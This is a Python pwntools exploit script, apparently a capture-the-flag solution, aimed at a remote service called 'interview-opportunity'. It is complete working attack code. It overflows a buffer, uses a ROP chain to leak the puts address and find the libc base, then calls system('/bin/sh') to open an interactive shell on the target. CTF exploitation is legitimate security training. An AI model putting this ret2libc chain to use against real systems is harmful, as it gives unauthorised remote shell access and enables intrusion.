#!/usr/bin/env python3
from pwn import *
import struct
#p = gdb.debug('./interview-opportunity', '''c''')
elf = ELF('./interview-opportunity')
#p = elf.process()
p = remote("mc.ax", 31081)
context.binary = elf
rop = ROP(elf)
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]
#print(hex(libc.symbols['system']))
#print(hex(libc.symbols['puts']))
#print(hex(libc.symbols['read']))
p.recvuntil(b"\n")
p.recvuntil(b"\n")
log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
PUTS_GOT = elf.got["puts"]
log.info("puts" + " GOT @ " + hex(PUTS_GOT))
    # Create rop chain
rop1 = b"A"*34 + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)
    #Parse leaked address
p.recvuntil(b"Hello: \n")
print(b"our junk:"+p.recvline())
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address,  "+"puts"+": "+ hex(leak))
libc.address = leak - libc.symbols["puts"] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
log.info("printf:%s" % hex(libc.symbols["printf"]))
log.info("read:%s" % hex(libc.symbols["read"]))
log.info("__libc_start_main:%s" % hex(libc.symbols["__libc_start_main"]))
log.info("system:%s" % hex(libc.sym["system"]))
log.info("exit:%s" % hex(libc.sym["exit"]))
BINSH = next(libc.search(b"/bin/sh")) #- 64
#BINSH = hex(libc.address + 0x1b75aa)
log.info("/bin/sh:%s" % hex(BINSH))
SYSTEM = (libc.sym["system"])
EXIT = libc.sym["exit"]
OFFSET = b'A'*34
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH)+p64(RET) + p64(SYSTEM) #+ p64(EXIT)

p.clean()
p.sendline(rop2)
p.recvuntil(b"\n")
p.recvuntil(b"\n")
#rop.raw("A"*34)
#rop.raw(0xdeadbeef)
#libc.address = 0x00007f06c33f3000
#rop.raw("A" * 34)
#rop.raw(0x401313) # pop_rdi address
#rop.raw(next(libc.search(b'/bin/sh'))) # target libc
#rop.raw(0x40101a)
#rop.raw(libc.symbols['system'])
#p.sendline(rop.chain())
p.interactive()
